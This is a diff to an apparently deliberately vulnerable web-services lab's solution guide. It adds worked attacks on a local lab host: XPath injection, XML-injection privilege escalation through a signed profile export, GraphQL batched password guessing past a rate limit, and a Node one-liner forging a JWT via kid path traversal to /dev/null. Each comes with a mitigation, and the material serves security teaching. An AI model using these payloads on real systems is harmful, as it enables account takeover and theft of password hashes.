@@ -335,11 +335,11 @@ The function executes during deserialization before any further processing.
 
 **Endpoint:** `GET /api/v2/release/:release`
 
-**Description:** The `:release` parameter is concatenated directly into an XPath expression that queries `fixtures/xml/config.xml`.
+**Description:** The `:release` parameter is concatenated directly into an XPath expression over `config/operations.xml`. The Resource Store reads the same document to validate active promotion codes and credit values. The release lookup should return only a matching version, but XPath injection can expose the promotion configuration.
 
 ### Challenge
 
-Extract all data from the server's XML configuration file.
+Discover an active promotion code through the release lookup, redeem it in the Resource Store, and verify that your persisted credit balance increases.
 
 ### Solution
 
@@ -353,7 +353,20 @@ The XPath query becomes:
 //config/*[local-name(.)='release' and //config//release/text()='0.0.1' or 1=1 or 'a'='a']
 ```
 
-This returns all nodes from `fixtures/xml/config.xml`, including database credentials and other sensitive configuration.
+The injected predicate makes the lookup return the top-level `<resourceStore>` element as well as `<release>`. Copy the value in `<promotion><code>` from the response and redeem it with a signed-in account:
+
+```http
+POST /api/v2/resource-store/promotions/redeem HTTP/1.1
+Host: dvws.local
+Authorization: Bearer <token>
+Content-Type: application/json
+
+{"code":"<code returned by XPath>"}
+```
+
+The response reports the credited amount and new balance. `GET /api/v2/resource-store` shows the persisted balance and redemption. An unknown code is rejected; the same account cannot redeem a code twice. The ordinary release response and Resource Store catalogue do not disclose the code.
+
+**Mitigation:** Use a fixed XPath expression with the release value passed as data, or compare the release element text directly. Keep promotion codes in a store that cannot be queried through public diagnostic endpoints.
 
 ---
 
@@ -444,37 +457,39 @@ The response XML contains a spoofed `<role>admin</role>` element injected betwee
 
 ## 12. XML Injection (Profile Export)
 
-**Endpoint:** `POST /api/v2/users/profile/export/xml`
+**Endpoints:** `PUT /api/v2/users/profile/bio`, `POST /api/v2/users/profile/export/xml`, `POST /api/v2/users/profile/restore/xml`
 
-**Description:** User-supplied `username` and `bio` fields are interpolated directly into an XML string without encoding.
+**Description:** A signed-in user can edit their own stored bio. Profile export loads that account from the database and interpolates the saved bio into signed XML without encoding it. The profile restore workflow verifies the signature, then uses the last `<admin>` element it finds to update the same account. An injected bio can add a second `<admin>` element to a server-produced export.
 
 ### Challenge
 
-Inject arbitrary XML tags into the exported profile to escalate your role.
+Save a bio that adds an administrator element to your profile export. Restore that exact signed export and confirm that your account gains administrator privileges. A new login is needed for the token to include the new role.
 
 ### Solution
 
 ```
-POST /api/v2/users/profile/export/xml HTTP/1.1
+PUT /api/v2/users/profile/bio HTTP/1.1
 Host: dvws.local
+Authorization: Bearer <regular-user-token>
 Content-Type: application/json
 
 {
-  "username": "test</username><role>admin</role><username>ignored",
-  "bio": "normal bio"
+  "bio": "Regular bio</bio><admin>true</admin><bio>"
 }
 ```
 
-The response XML will contain:
+Export the saved profile with `POST /api/v2/users/profile/export/xml` and the same bearer token. The request body does not supply profile fields. Keep the exact XML response and its `X-Profile-Export-Signature` response header. The XML contains:
 ```xml
 <userProfile>
-  <username>test</username><role>admin</role><username>ignored</username>
-  <role>user</role>
-  <bio>normal bio</bio>
+  <username>test</username>
+  <admin>false</admin>
+  <bio>Regular bio</bio><admin>true</admin><bio></bio>
 </userProfile>
 ```
 
-An XML consumer reading the first `<role>` tag will see "admin".
+Send `{"xml":"<exact export>","signature":"<X-Profile-Export-Signature>"}` to `POST /api/v2/users/profile/restore/xml` with the same bearer token. The restore response reports `admin: true`; signing in again gives the account administrator permissions. A hand-written XML document without the export signature is rejected. This is distinct from challenge 13's direct, unauthenticated import endpoint.
+
+**Mitigation:** Escape all user-controlled values when serializing XML, and reject duplicate security-sensitive fields on import. A valid signature authenticates the bytes produced by the exporter; it does not make those bytes safe to interpret.
 
 ---
 
@@ -1200,11 +1215,11 @@ The `../` sequences traverse out of the uploads directory. The file is written t
 
 **Endpoint:** `POST /graphql`
 
-**Description:** Apollo Server is configured with `allowBatchedHttpRequests: true`, allowing multiple operations in a single HTTP request.
+**Description:** The GraphQL gateway allows ten POST requests per client in 30 seconds, counting each HTTP request once. Apollo Server also accepts an array of operations in one request. Each `userLogin` mutation checks a real account password, so a batch can test more passwords than the request limit permits as separate calls.
 
 ### Challenge
 
-Brute-force passphrase reminders by batching hundreds of queries in one request.
+Compare eleven separate `userLogin` attempts with one HTTP request containing eleven login mutations. Include the real password in the batch and use the returned token on a protected REST endpoint.
 
 ### Solution
 
@@ -1213,14 +1228,15 @@ POST /graphql HTTP/1.1
 Content-Type: application/json
 
 [
-  {"query": "{ attempt1: getPassphrase(reminder: \"dog\") { passphrase reminder } }"},
-  {"query": "{ attempt2: getPassphrase(reminder: \"cat\") { passphrase reminder } }"},
-  {"query": "{ attempt3: getPassphrase(reminder: \"test1\") { passphrase reminder } }"},
-  {"query": "{ attempt4: getPassphrase(reminder: \"password\") { passphrase reminder } }"}
+  {"query": "mutation { userLogin(username: \"test\", password: \"wrong1\") { token } }"},
+  {"query": "mutation { userLogin(username: \"test\", password: \"wrong2\") { token } }"},
+  {"query": "mutation { userLogin(username: \"test\", password: \"test\") { token } }"}
 ]
 ```
 
-All queries execute in a single HTTP request, bypassing any per-request rate limiting. Scale to hundreds of guesses per batch.
+The wrong passwords return GraphQL authentication errors, while the matching password returns a JWT that works on `GET /api/v2/notes`. Expand the array to eleven guesses: the gateway still counts one HTTP request. Eleven separate POST requests from the same client receive HTTP 429 on the last request. The gateway currently trusts `X-Forwarded-For` for client identity, as described in challenge 30.
+
+**Mitigation:** Apply a login-attempt budget to each `userLogin` resolver execution, including every operation in a batch, and use a trusted client identity for rate limiting.
 
 ---
 
@@ -1683,15 +1699,22 @@ V2 returns HTTP 401. V1 returns HTTP 200 and a token that can access the notes e
 
 **Endpoint:** `GET /api/v2/reports/activity?limit=N`
 
-**Scenario:** An authenticated report API returns synthetic activity records. It defaults to 20 but accepts up to 5,000 in a single response, making one request substantially larger than the ordinary page.
+**Scenario:** Successful logins, note creation, and Resource Store orders create persistent account activity events. The authenticated report reads the caller's events from MongoDB. It defaults to 20 but accepts up to 5,000 in one response, so a populated account can request a much larger database result and response than the ordinary page.
 
 ### Challenge
 
-Request the report with and without `limit=5000`, then compare the record counts and response sizes. A token is required.
+Create a fresh account, sign in, and create at least 50 notes or Resource Store orders. Request the report with and without `limit=5000`; compare the record counts, returned event IDs, and response sizes. A token is required.
 
 ### Solution
 
 ```sh
+for i in $(seq 1 50); do
+  curl -s -X POST 'http://dvws.local/api/v2/notes' \
+    -H 'Authorization: Bearer <token>' \
+    -H 'Content-Type: application/json' \
+    -d "{\"name\":\"Activity $i\",\"body\":\"Saved note $i\",\"type\":\"public\"}" > /dev/null
+done
+
 curl -s 'http://dvws.local/api/v2/reports/activity' \
   -H 'Authorization: Bearer <token>' -o default.json
 
@@ -1701,7 +1724,7 @@ curl -s 'http://dvws.local/api/v2/reports/activity?limit=5000' \
 wc -c default.json large.json
 ```
 
-The responses contain 20 and 5,000 records respectively. The records are deterministic synthetic data. Invalid, nonpositive, and above-5,000 limits return HTTP 400; the ceiling is a lab safety bound.
+For a fresh account with one login and 50 saved notes, the first response contains 20 events and the second contains 51. The larger request reads more persisted documents and transfers more bytes; it does not invent rows to reach the requested limit. Event `subject` values refer to the saved note or order IDs. Invalid, nonpositive, and above-5,000 limits return HTTP 400; the ceiling is a lab safety bound.
 
 **Mitigation:** Enforce a small page-size cap, paginate results, and set response or resource budgets for expensive report operations.
 
@@ -1861,21 +1884,21 @@ The shared middleware fetches the attacker's JWK set, verifies the token with th
 
 ## 57. JWT KID Path Traversal
 
-**Endpoints:** `GET /api/v2/jwt-key-lab/kid/profile`; shared authentication used by protected routes such as `GET /api/v2/admin/logs`
+**Endpoints:** Shared authentication on protected routes such as `GET /api/v2/users` and `GET /api/v2/resource-store`
 
 **Description:** The shared application JWT middleware uses an untrusted JWT `kid` value as a filesystem path without constraining it to the key directory. Its legacy loader treats the selected file as Base64 key material. Traversing to `/dev/null` yields the one-byte NUL secret (`AA==`), allowing an attacker to forge a bearer token that passes authentication on protected application routes. This is an authentication bypass. The selected file is used only as signing-key material; the application does not return its contents, so this challenge does not demonstrate arbitrary file disclosure.
 
 ### Challenge
 
-Sign an HS256 JWT with header `{"alg":"HS256","kid":"../../../../../../dev/null"}` and payload `{"user":"admin","permissions":["user:admin"]}` using the one-byte NUL secret. Then request a protected route, for example:
+Sign an HS256 JWT with header `{"alg":"HS256","kid":"../../../../../../dev/null"}` and an administrator identity using the one-byte NUL secret. Request the real user-list endpoint first without a token, then with the forged token:
 
 ```sh
-TOKEN=$(node -e 'const j=x=>Buffer.from(JSON.stringify(x)).toString("base64url");const a=j({alg:"HS256",kid:"../../../../../../dev/null"}),b=j({user:"admin",permissions:["user:admin"]}),s=require("crypto").createHmac("sha256",Buffer.from([0])).update(a+"."+b).digest("base64url");process.stdout.write(a+"."+b+"."+s)')
-curl http://dvws.local/api/v2/admin/logs \
+TOKEN=$(node -e 'const jwt=require("jsonwebtoken");process.stdout.write(jwt.sign({user:"admin",permissions:["user:admin"]},Buffer.from([0]),{algorithm:"HS256",issuer:"https://github.com/snoopysecurity",header:{kid:"../../../../../../dev/null"}}))')
+curl http://dvws.local/api/v2/users \
   -H "Authorization: Bearer $TOKEN"
 ```
 
-The shared auth middleware accepts the forged token. A `200` response confirms authentication succeeded; `/api/v2/admin/logs` may have an empty body when the process has no login attempts in its in-memory log. The isolated `/kid/profile` route remains a synthetic demonstration of the same key traversal. Neither route returns the contents of the file named by `kid`.
+Without authentication, `/api/v2/users` returns HTTP 401. With the forged token, the shared middleware accepts it and the endpoint returns stored user accounts, including password hashes. A token forged for a Resource Store customer can also read that account's wallet and orders. An incorrectly signed token returns HTTP 401. The selected file supplies signing-key material; its contents are not returned by the application.
 
 **Mitigation:** Treat `kid` as an identifier, not a path. Look it up in a fixed in-memory or configured key map; if files must be used, canonicalize the path and verify it remains beneath the key directory. Use high-entropy keys and pin the expected algorithm.
 
@@ -1887,7 +1910,7 @@ The shared auth middleware accepts the forged token. A `200` response confirms a
 |----------|-----------|
 | **Injection** | `/api/v2/passphrase`, `/api/v2/notesearch`, `/api/v2/sysinfo/:cmd`, `/dvwsuserservice`, `/api/v2/release/:r`, `/api/v2/users/ldap-search` |
 | **Broken Auth** | All authenticated endpoints (JWT none/weak secret), `/api/v1/login`, `/api/v2/users/change-password` |
-| **JWT Key Handling** | Shared auth middleware (`jku` trust); `/api/v2/jwt-key-lab/kid/profile` |
+| **JWT Key Handling** | Shared auth middleware (`jku` trust and `kid` path traversal) |
 | **Data Exposure** | `/api/v1/info`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/users/profile`, `/api/v2/account-recovery/lookup`, `/graphql` (userLogin, userSearchByUsername, userFindbyId) |
 | **XXE/XML** | `/dvwsuserservice`, `/api/v2/notes/import/xml`, `/api/v2/users/profile/export/xml`, `/api/v2/users/profile/import/xml` |
 | **Access Control** | `/api/v2/notes/:id`, `/api/v2/passphrase/:user`, `/api/v2/sysinfo/:cmd`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/account-recovery/lookup`, `/api/v2/account-recovery/reset` |
